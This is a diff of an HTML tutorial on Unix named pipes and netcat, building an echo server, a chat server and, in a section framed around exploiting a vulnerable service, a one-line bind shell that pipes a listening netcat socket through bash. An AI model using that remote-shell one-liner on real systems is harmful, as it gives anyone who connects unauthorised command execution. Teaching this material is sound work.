@@ -41,18 +41,22 @@
 <h2 id="pipes">Pipes</h2>
 <p>Commonly, pipes are used in the shell to redirect the <code>stdout</code> of one
 process to the <code>stdin</code> of another, you simply</p>
-<pre><code class="language-sh">$ cat myfile | grep sometext</code></pre>
+<pre><code class="lang-sh">$ cat myfile | grep sometext
+</code></pre>
 <h2 id="named-pipes">Named pipes</h2>
 <p>Since <code>|</code> pipes are anonymous, they cannot be referenced externally.
 Named pipes on the other hand have an accesible path in the
 filesystem.</p>
-<pre><code class="language-sh">$ mkfifo /tmp/mypipe</code></pre>
+<pre><code class="lang-sh">$ mkfifo /tmp/mypipe
+</code></pre>
 <p>These pipes allow us to setup flows across different shell commands.
 Data can be pumped in by one command and fed to another command. Like,</p>
-<pre><code class="language-sh">$ cat /tmp/mypipe</code></pre>
+<pre><code class="lang-sh">$ cat /tmp/mypipe
+</code></pre>
 <p>This command blocks till the named pipe spews and <code>EOF</code> marker.</p>
 <p>And in another shell,</p>
-<pre><code class="language-sh">$ cat &gt; /tmp/mypipe</code></pre>
+<pre><code class="lang-sh">$ cat &gt; /tmp/mypipe
+</code></pre>
 <p>Now, whatever you type in the this shell should be visible in the
 other shell. Press <kbd>Ctrl-D</kbd> to exit.</p>
 <p>Named pipes are primarily used as IPC mechanisms along with UNIX
@@ -70,12 +74,14 @@ output.</p>
 <p>The <a href="http://sectools.org/tool/netcat/">netcat</a> utility helps us setup
 a simple listening socket that can be communicated with using <code>stdin</code>
 and <code>stdout</code>.</p>
-<pre><code class="language-sh">$ cat /tmp/mypipe | nc -l 59000 &gt; /tmp/mypipe</code></pre>
+<pre><code class="lang-sh">$ cat /tmp/mypipe | nc -l 59000 &gt; /tmp/mypipe
+</code></pre>
 <p>Simply <code>cat</code>ing the contents of a pipe to the input of the <code>nc</code>
 command with the <code>-l</code> option that sets up a port to listen on and
 write any incoming data to the same pipe so that it’s echoed
 back. Then,</p>
-<pre><code class="language-sh">$ nc &lt;network-address&gt; 59000</code></pre>
+<pre><code class="lang-sh">$ nc &lt;network-address&gt; 59000
+</code></pre>
 <p>There you have it, an <em>echo server in one line of bash</em></p>
 <h2 id="remote-shell">Remote Shell</h2>
 <p>Suppose, you have discovered a vulnerability in some service that
@@ -88,7 +94,8 @@ hack!</p>
 <p>Like the earlier snippet we set up a circular input path. The only
 difference being we pipe the user input through the bash interpreter
 that executes <code>stdin</code> and pipe it’s <code>stdout</code> back to the network socket.</p>
-<pre><code class="language-sh">$ cat /tmp/mypipe | bash | nc -l 59000 &gt; /tmp/mypipe</code></pre>
+<pre><code class="lang-sh">$ cat /tmp/mypipe | bash | nc -l 59000 &gt; /tmp/mypipe
+</code></pre>
 <p>Just connect to that port and you should have a working remote shell.</p>
 <h2 id="chat-server">Chat Server</h2>
 <p>A chat server is another application that falls into the same problem
@@ -99,7 +106,8 @@ concurrent nodes.</p>
 connection. Luckily, there’s <a href="http://nmap.org/ncat/">this</a> rewrite of
 the netcat tool that allows us to accept multiple incoming connections
 simultaneously.</p>
-<pre><code class="language-sh">$ cat /tmp/mypipe | ncat -l -k 59000 &gt; /tmp/mypipe</code></pre>
+<pre><code class="lang-sh">$ cat /tmp/mypipe | ncat -l -k 59000 &gt; /tmp/mypipe
+</code></pre>
 <p>Now multiple hosts can connect to that port and exchange messages with
 each other.</p>
 
